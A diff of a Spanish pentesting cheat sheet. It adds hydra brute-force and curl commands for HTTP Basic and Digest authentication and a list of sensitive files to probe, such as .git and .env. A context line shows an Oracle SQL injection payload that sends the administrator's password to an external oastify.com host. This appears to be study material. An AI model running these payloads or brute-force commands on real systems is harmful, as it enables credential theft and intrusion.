@@ -734,6 +734,42 @@ En cualquier caso debe seguir las reglas generales, por ejemplo una UNION debe l
     ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xrsy1oc2weq1cilvi2czyiwyipogc7avz.oastify.com/'||(SELECT password from users where username='administrator')||'"> %remote;]>'),'/l') FROM dual--
 ```
 
+## Command Injection:
+La ejecución de codigo puede ser desde diferente perspectiva, pero el objetivo es realizar una ejecución de codigo
+
+## HTTP Authentication:
+
+1. Basic Auth:
+   - hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.168.x.x http-get /basic-auth/
+   - curl -u admin:cookie1 192.209.143.3/basic/
+
+3. Digest Auth:
+   - hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.168.x.x http-get /digest-auth/
+   - curl --digest -u admin:adminpasswd 192.209.143.3/digest-auth/
+  
+## Exposición de ficheros sensibles:
+Permitir la lectura de ficheros puede deberse a diversas situaciones, pero en lo personal me gusta dividirlo en estas categorias:
+
+1. Ficheros intencionales: Son aquellos que son necesarios para el funcionamiento normal de una aplicación, y deben estar expuestos pero a veces son demasiado especificos.
+   - robots.txt: Fichero donde se pone directorios o ficheros que no se quiere que se indexe.
+   - sitemap.xml: Fichero donde se pone directorios o ficheros que no quiere que se indexe.
+   - crossdomain.xml: Usado por flash apps, pero puede permitir accesos indebidos.
+   - security.txt: Fichero con información sobre el responsable de seguridad, pero puede contener más información.
+
+2. Ficheros no intencionales: Son aquellos que las herramientas, servidor web, etc. crean por defecto, pero que tambien un usuario puede crear pensando que nadie lo encontrara.
+   - Creados por servicios:
+     - .git Carpeta usada por git para seguimiento del proyecto que contiene información sensible como el codigo.
+     - .svn Carpeta usada por subversion (similar a git) para seguimiento del proyecto que contiene información sensible como el codigo.
+     - .env	Ficheros del ambiente del sistema que pueden contener claves de acceso
+     - server-status Pagina generada por apache "mod_status" para dar seguimiento al estatus del servidor
+     - .DS_Store Carpeta creada por MAC que puede contener información del servidor
+     - debug.log Ficheros de depuración y logs colocados dentro de la carpeta del web server
+     - swagger.json, api-docs.json, openapi.json Ficheros con información sobre como funcionan las API
+   - Subidos por el usuario:
+     - backup.zip Respaldos creados en la misma carpeta del servidor
+     - config.phg.old Respaldos individuales de ficheros
+     - database.sql Ficheros de base de datos o configuraciones locales
+
 ## IDOR:
 Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.
 
